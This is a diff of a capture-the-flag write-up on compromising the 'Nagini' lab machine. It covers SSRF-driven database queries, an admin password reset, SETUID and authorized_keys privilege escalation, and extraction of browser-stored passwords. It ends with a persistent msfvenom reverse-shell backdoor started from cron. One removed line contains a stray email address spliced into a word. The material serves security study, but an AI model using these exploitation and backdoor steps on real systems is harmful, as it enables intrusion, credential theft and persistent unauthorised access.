@@ -95,7 +95,7 @@ First, we try to find the target machine and get its IP address. The ***netdisco
     <img src="./images/target_discovery/netdiscover.png" width="720">
 </p>
 
-The first three addresses are used by Virtual Box to handle NAT network virtualization. Therefore, we can assume by exclusion that **10.0.2.4** is the address of the Nagini virtual machine.
+The first three addresses are used by Virtual Box to handle NAT network virtualization. Therefore, we can assume by exclusion that **10.0.2.4** is the address of the *Nagini* virtual machine.
 
 ## Reachability of the target machine
 
@@ -119,7 +119,7 @@ Once we have discovered the IP address of the target machine, we can proceed wit
     <img src="./images/target_discovery/active_os_fingerprinting.png" width="720">
 </p>
 
-We discover that a Linux-based operating system, whose version is between 4.15 and 5.6, is installed on the Nagini target machine.
+We discover that a Linux-based operating system, whose version is between 4.15 and 5.6, is installed on the *Nagini* target machine.
 
 # 4. Enumerating Target & Port Scanning
 
@@ -168,7 +168,7 @@ From the output of the previous command, you can see that there are no open UDP 
 
 # 5. Vulnerability Mapping
 
-Once we have discovered the operating system and the services that the target machine Nagini provides, we need to understand whether or not the exposed services or the operating system have vulnerabilities that can be exploited.
+Once we have discovered the operating system and the services that the target machine *Nagini* provides, we need to understand whether or not the exposed services or the operating system have vulnerabilities that can be exploited.
 
 ## Automated Vulnerability Analysis
 
@@ -218,15 +218,15 @@ The following graphics, which can be found in the "Finding Summary" section of t
 
 ## Web Vulnerability Analysis
 
-Since the Nagini target computer has a web server and exposes web services, you can proceed to discover potential web vulnerabilities. For this purpose, it is necessary to use several web vulnerability analysis tools.
+Since the *Nagini* target computer has a web server and exposes web services, you can proceed to discover potential web vulnerabilities. For this purpose, it is necessary to use several web vulnerability analysis tools.
 
 ### Information Leakage - gobuster
 
-We check whether there has been an exposure of critical and/or sensitive information about a web application and/or web server. This type of vulnerability can be detected and exploited through web crawling and bruteforce directory tools. For example, it is possible to use the ***gobuster*** tool. The ***gobuster*** tool isn't installed in Kali, but it can be installed with the following command:
+We check whether there has been an exposure of critical and/or sensitive information about a web application and/or web server. This type of vulnerability can be detected and exploited through web crawling and bruteforce directory tools. For example, it is possible to use the **gobuster** tool. The **gobuster** tool isn't installed in Kali, but it can be installed with the following command:
 
     sudo apt install gobuster
 
-Once ***gobuster*** is installed, we can proceed with the following command:
+Once **gobuster** is installed, we can proceed with the following command:
 
     gobuster dir -u http://10.0.2.4 -x html,txt,php,bak -w /usr/share/wordlists/dirb/common.txt
 
@@ -238,20 +238,22 @@ Once ***gobuster*** is installed, we can proceed with the following command:
 <p align="center">
     <img src="./images/vulnerability_mapping/gobuster.png" width="720">
 </p>
-From the output of the previous command we can see that we have access to the index.html page, the notes.txt file, and the presence of the /joomla directory.
 
-The index.html page contains no useful information. In fact, its content is the following:
+From the output of the previous command we can see that we have access to the ```index.html``` page, the ```notes.txt``` file, and the presence of the ```/joomla``` directory.
+
+The ```index.html``` page contains no useful information. In fact, its content is the following:
 
 <p align="center">
     <img src="./images/vulnerability_mapping/index.png" width="720">
 </p>
 
-Instead, the content of the notes.txt file is the following:
+Instead, the content of the ```notes.txt``` file is the following:
 
 <p align="center">
     <img src="./images/vulnerability_mapping/note.png" width="720">
 </p>
-It appears that the web server uses the HTTP3 protocol, which is currently not supported by Firefox. The following guide <https://github.com/cloudflare/quiche> was followed to install ***quiche***, which is an implementation of the QUIC and HTTP3 transport protocol. In this way, the web server can be contacted using the HTTP3 protocol. In fact, once quiche is installed, the web server is clomifox856@mahmul.comontacted using the HTTP3 protocol with the command:
+
+It appears that the web server uses the HTTP3 protocol, which is currently not supported by Firefox. The following guide <https://github.com/cloudflare/quiche> was followed to install **quiche**, which is an implementation of the QUIC and HTTP3 transport protocol. In this way, the web server can be contacted using the HTTP3 protocol. In fact, once quiche is installed, the web server is contacted using the HTTP3 protocol with the command:
 
     /quiche/target/debug/examples/http3-client https:10.0.2.4
 
@@ -263,8 +265,8 @@ This is the result:
 
 The following information is obtained:
 
-1. A **configuration backup file** (**.bak**) exists in the web server and is readable by anyone.
-2. The presence of an **/internalResourceFeTcher.php** page. It wasn't discovered by ***gobuster*** and its content is the following:
+1. A ```configuration backup file``` (```.bak```) exists in the web server and is readable by anyone.
+2. The presence of an ```/internalResourceFeTcher.php``` page. It wasn't discovered by **gobuster** and its content is the following:
 
 <p align="center">
     <img src="./images/vulnerability_mapping/internalResourceFeTcher.png" width="720">
@@ -280,17 +282,17 @@ In this case, a **Server-Side Request Forgery** (**SSRF**) vulnerability is pres
 
 ### Information Leakage - JoomScan
 
-Returning to the output of the gobuster command, there is a **/joomla** directory. This confirms that **Joomla** is installed on the Nagini machine. In fact, it is possibile to visualize the following page at <http://10.0.2.4/joomla/>:
+Returning to the output of the gobuster command, there is a ```/joomla``` directory. This confirms that **Joomla** is installed on the *Nagini* machine. In fact, it is possibile to visualize the following page at ```http://10.0.2.4/joomla/```:
 
 <p align="center">
     <img src="./images/vulnerability_mapping/joomla_home.png" width="720">
 </p>
 
-The ***JoomScan*** tool can be used to discover vulnerability and missconfiguration related to the installed Joomla CMS version. This tool isn't installed on Kali, but can be installed with the following command:
+The **JoomScan** tool can be used to discover vulnerability and missconfiguration related to the installed Joomla CMS version. This tool isn't installed on Kali, but can be installed with the following command:
 
     sudo apt install joomscan
 
-Once ***JoomScan*** is installed, we can proceed with the following command:
+Once **JoomScan** is installed, we can proceed with the following command:
 
     joomscan -u http://10.0.2.4/joomla 
 
@@ -300,7 +302,7 @@ A partial output with useful information is shown below:
     <img src="./images/vulnerability_mapping/joomscan.png" width="720">
 </p>
 
-A **configuration.php.bak** file was found. This is a configuration backup file that can be read by anyone. Therefore, let's download it:
+A ```configuration.php.bak``` file was found. This is a configuration backup file that can be read by anyone. Therefore, let's download it:
 
     wget http://10.0.2.4/joomla/configuration.php.bak
 
@@ -314,9 +316,9 @@ A partial output with useful information is shown below:
     <img src="./images/vulnerability_mapping/configuration.png" width="720">
 </p>
 
-We find that there is a **goblin** user, which is not password protected and can access to a MySQL database called **joomla**.
+We find that there is a ```goblin``` user, which is not password protected and can access to a **MySQL database** called ```joomla```.
 
-In addition, an administrator login page was found, with ***JoomScan*** tool, at <http://10.0.2.4/>:
+In addition, an administrator login page was found, with **JoomScan** tool, at ```http://10.0.2.4/joomla/administrator```:
 
 <p align="center">
     <img src="./images/vulnerability_mapping/joomla_admin.png" width="720">
@@ -328,7 +330,7 @@ The goal of this phase is to exploit the vulnerabilities discovered during the p
 
 ## Database Exploitation
 
-From the Vulnerability Mapping phase, we discovered that the Nagini target machine is affected by a **Server-Side Request Forgery** (**SSRF**) vulnerability because through the **/internalResourceFeTcher.php** page it's possible to cause the web server to make HTTP requests to arbitrary domains. Let's try to exploit this  vulnerability.
+From the Vulnerability Mapping phase, we discovered that the *Nagini* target machine is affected by a **Server-Side Request Forgery** (**SSRF**) vulnerability because through the ```/internalResourceFeTcher.php``` page it's possible to cause the web server to make HTTP requests to arbitrary domains. Let's try to exploit this  vulnerability.
 
 If we enter a string like ```file://path_to_file``` inside the form, the web server should show us the contents of the file on the screen. For example, if we enter ```file:///etc/passwd``` this is what we get:
 
@@ -346,7 +348,7 @@ Since we know that there is **Server-Side Request Forgery** (**SSRF**), we can u
 
 At this point we need to provide the username of the user who has access to the database and the SQL code we want to run. In output we will be returned the payload.
 
-Since we know that there is a database called "joomla", let's try to generate the payload for executing the query:
+Since we know that there is a database called ```joomla```, let's try to generate the payload for executing the query:
 
 ```sql
 USE joomla; SHOW tables;
@@ -356,25 +358,25 @@ USE joomla; SHOW tables;
     <img src="./images/target_exploitation/payload1.png" width="720">
 </p>
 
-Next, we insert the generated payload into the form of the /internalResourceFeTcher.php page, to force the query execution and get the database tables:
+Next, we insert the generated payload into the form of the ```/internalResourceFeTcher.php``` page, to force the query execution and get the database tables:
 
 <p align="center">
     <img src="./images/target_exploitation/output_payload1.png" width="720">
 </p>
 
-We find that a joomla_user table exists. At this point we re-run the gopherus tool and generate the payload for executing the query:
+We find that a ```joomla_user``` table exists. At this point we re-run the gopherus tool and generate the payload for executing the query:
 
 ```sql
 USE joomla; SELECT * FROM joomla_users;
 ```
 
-In this way we obtain the joomla_users table content.
+In this way we obtain the ```joomla_users``` table content.
 
 <p align="center">
     <img src="./images/target_exploitation/payload2.png" width="720">
 </p>
 
-Again, we insert the generated payload into the 'form':
+Again, we insert the generated payload into the form:
 
 <p align="center">
     <img src="./images/target_exploitation/output_payload2.png" width="720">
@@ -388,13 +390,13 @@ SET password='21232f297a57a5a743894a0e4a801fc3'
 WHERE email='site_admin@nagini.hogwarts';
 ```
 
-in order to change the administrator's password. In the previous command, the string "21232f297a57a5a743894a0e4a801fc3" is the MD5 of the string "admin". MD5 was used because it's supported by MySQL in Joomla.
+in order to change the administrator's password. In the previous command, the string ```21232f297a57a5a743894a0e4a801fc3``` is the MD5 of the string ```admin```. MD5 was used because it's supported by MySQL in Joomla.
 
 <p align="center">
     <img src="./images/target_exploitation/payload3.png" width="720">
 </p>
 
-Again, we insert the generated payload into the 'form':
+Again, we insert the generated payload into the form:
 
 <p align="center">
     <img src="./images/target_exploitation/output_payload3.png" width="720">
@@ -406,8 +408,8 @@ We were able to change the administrator's password.
 
 Since we have changed the administrator's password, we go to the administrator login page and try to authenticate with the new credentials:
 
-- **username**: site_admin
-- **passowrd**: admin
+- **username**: ```site_admin```
+- **passowrd**: ```admin```
 
 <p align="center">
     <img src="./images/target_exploitation/home_admin.png" width="720">
@@ -458,19 +460,170 @@ We were able to obtain a meterpreter shell on the target machine.
 
 # 7. Post-Exploitation
 
+Two are the main goals of this phase:
+
+- **Privilege Escalation**: acquire additional privileges inside the target machine  target until maximum access privileges (root) are achieved;
+- **Mantaining Access**: install a backdoor which allows us to easly access into the target machine without repeating the entire attack.
+
 ## Local Exploit
+
+Since we obatained a meterpreter shell on the target machine, we can try to use the ```post/multi/recon/local_exploit_suggester``` module to discover possible exploitable **local exploit**. For this purpose, we execute the following command:
+
+    run post/multi/recon/local_exploit_suggester
+
+<p align="center">
+    <img src="./images/post_exploitation/local_exploit_suggester.png" width="720">
+</p>
+
+Unfortunaly, no local exploit was found that could be used. Therefore, we proceed to a manual analysis of the target machine.
 
 ## Privilege Escalation
 
+We can obtain a bash shell with the ```shell -t``` command:
+
+<p align="center">
+    <img src="./images/post_exploitation/bash.png" width="720">
+</p>
+
+We can notice that we are authenticated as a ```www-data``` user. We enter go into ```/home``` directory and see which other users' home directories can be accessed:
+
+<p align="center">
+    <img src="./images/post_exploitation/home_directories.png" width="720">
+</p>
+
+We can access the home directories of ```snape``` and ```hermoine```.
+
 ### Privilege Escalation - snape user
+
+This is the contents of ```snape``` home directory:
+
+<p align="center">
+    <img src="./images/post_exploitation/snape_home_directory.png" width="720">
+</p>
+
+We can notice the presence of the ```.creds.txt``` file that can be read by anyone. This file may contain the password of the user ```snape```. Therefore, let's show the content:
+
+<p align="center">
+    <img src="./images/post_exploitation/creeds.png" width="720">
+</p>
+
+The content appears to be encoded. It could be encoded in **base64**. In fact, a base64-encoded string has a multiple length of 16, has only alphanumeric characters, and any padding is added at the end via "=" characters. Therefore, let's try to decode it:
+
+<p align="center">
+    <img src="./images/post_exploitation/snape_passwd.png" width="720">
+</p>
+
+We get the password of the ```snape``` user, which is ```Love@lilly```. Let's try to authenticate ourselves as him:
+
+<p align="center">
+    <img src="./images/post_exploitation/snape_authentication.png" width="720">
+</p>
 
 ### Privilege Escalation - hermoine user
 
+This is the contents of ```hermoine``` home directory:
+
+<p align="center">
+    <img src="./images/post_exploitation/hermoine_home_directory.png" width="720">
+</p>
+
+We have access to the ```bin``` and ```.ssh``` directories but not to the ```mozilla``` directory. This is the contents of ```bin``` directory:
+
+<p align="center">
+    <img src="./images/post_exploitation/bin_content.png" width="720">
+</p>
+
+we can notice the presence of the executable file ```su_cp``` that has the ```SETUID``` bit enabled. This means that if you run it, you get, for the duration of its execution, the privileges of the ```hermoine``` user. Let's try to understand what this executable does:
+
+<p align="center">
+    <img src="./images/post_exploitation/su_cp.png" width="720">
+</p>
+
+It's an alternative version of ```cp``` command that has the SETUID bit enabled on the ```hermoine``` user permissions.
+
+In the SSH specification there is a particular file called ```authorized_keys``` in which the SSH keys of the hosts from which we accept connections via SSH are specified. Thus, to obtain hermoine user privileges we can proceed in the following way:
+
+1. As a ```snape``` user, generate an SSH key with the ```ssh-keygen``` command;
+2. Create a ```authorized_keys``` file with inside the generated key with the following command:
+
+<p></p>
+
+    cp .ssh/id_rsa.pub authorized_keys;
+
+3. Copy the file ```authorized_keys``` inside the ```.ssh``` directory of the user ```hermoine``` using the executable ```su_cp```. In this way, the file owner will be ```hermoine```:
+
+<p align="center">
+    <img src="./images/post_exploitation/step3.png" width="720">
+</p>
+
+4. Authenticate as user ```hermoine``` via ssh:
+
+<p align="center">
+    <img src="./images/post_exploitation/hermoine_authentication.png" width="720">
+</p>
+
+we were able to authenticate ourselves as user ```hermoine```.
+
 ### Privilege Escalation - root user
+
+In the ```hermoine``` user's home directory there is a ```.mozilla``` directory. This directory is automatically created when you start Firefox for the first time and 
+contains the files and settings related to the said browser. We can use the ```firefox_decrypt``` tool, available at the following github repository <https://github.com/unode/firefox_decrypt>.
+
+Normally this tool is used for recovering Firefox profile passwords, but we will use it to extract them. Once we have installed the tool and downloaded the ```.mozilla``` directory to the attacking machine via scp, we can run the following command to start the tool:
+
+<p align="center">
+    <img src="./images/post_exploitation/firefox_decrypt.png" width="720">
+</p>
+
+We get the password of the root user, which is ```@Alohomora#123```. Let's try to authenticate ourselves as him:
+
+<p align="center">
+    <img src="./images/post_exploitation/root_authentication.png" width="720">
+</p>
 
 ## Mantaining Access
 
+In the previous Privilege Escalation step, we were able to obtain maximum privileges, i.e. ```root``` user privileges, on the *Nagini* target machine. At this point, to avoid having to repeat the whole process all over again, we proceed with the installation of a **persistent backdoor** that allows us to access the target machine more easily. For this purpose, on the attacking machine, we use the command:
+
+    msfvenom -p cmd/unix/reverse_python LHOST=10.0.2.15 LPORT=4444
+
+to generate the payload of a **python reverse shell**:
+
+<p align="center">
+    <img src="./images/post_exploitation/python_reverse_shell.png" width="720">
+</p>
+
+> **Remarks**: remember to replace python with python3 because python3 is installed on the target machine
+
+Next, we create on the target machine, within the ```/etc``` directories, a script called ```in.sh``` with the payload inside.
+
+In Unix and Unix-like operating systems, the ```cron``` command allows the scheduling of commands, that is, it allows commands to be registered with the system and then executed periodically and automatically by the system. For this purpose, through the ```crontab -e``` command we can edit the file in which the scheduled commands are indicated. We edit the said file by adding the following string:
+
+    @reboot /etc/in.sh
+
+In this way, the target machine will execute the script containing the reverse shell payload at every startup. In this way, at each boot of the target machine, a connection will be established with the attacking machine, which will be listening on port 4444, for example, via ```netcat```:
+
+    nc -lvp 4444
+
+<p align="center">
+    <img src="./images/post_exploitation/netcat.png" width="720">
+</p>
+
+We were able to install a backdoor that gives us direct access to the target machine as the ```root``` user each time it starts up.
+
 # 8. Conclusions
+
+During the analysis of the *Nagini* machine, several vulnerabilities were found that would expose it to attacks by malicious users. In fact, we were able to gain full control and maximum privileges.
+
+These vulnerabilities mainly concern:
+
+- Passwords stored in plain text;
+- Users without passwords;
+- Configuration files readable by anyone;
+- Executables with unfairly elevated privileges;
+- Outdated versions of operating system and applications.
+
+We can conclude by saying that the **security level** of the *Nagini* machine is **extremely low**.
 
 # 9. References
 
